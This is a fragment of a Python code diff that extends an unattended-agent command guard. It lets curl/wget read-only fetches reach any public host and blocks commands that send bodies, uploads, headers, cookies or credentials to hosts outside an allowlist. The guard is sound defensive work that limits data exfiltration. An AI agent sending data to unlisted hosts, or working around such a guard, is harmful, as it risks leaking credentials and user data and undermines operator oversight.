+        # host_allowlisted covers KNOWN_HOSTS plus the record-derived client and
+        # lead domains. An unlisted host is still reachable by a PLAIN READ-ONLY
+        # FETCH (see read_only_fetch_refusal): Joe's 2026-10-07 ruling that
+        # research may use the whole internet. Anything that sends stays
+        # allowlist-only, by design.
+        unlisted = [h for h in hosts_in(cmd) if not host_allowlisted(h)]
+        if unlisted:
+            why = read_only_fetch_refusal(cmd, cwd)
+            if why is not None:
+                return (f"network send to an unrecognised host ({unlisted[0]}) — blocked by the "
+                        f"CARR unattended guard: {why}. A plain curl/wget GET or download "
+                        f"(no body, upload, header, cookie, credential or $-expansion) may reach "
+                        f"any public host; a command that SENDS data needs the host in KNOWN_HOSTS.")
 
     reason = render_write_target(cmd)
     if reason:
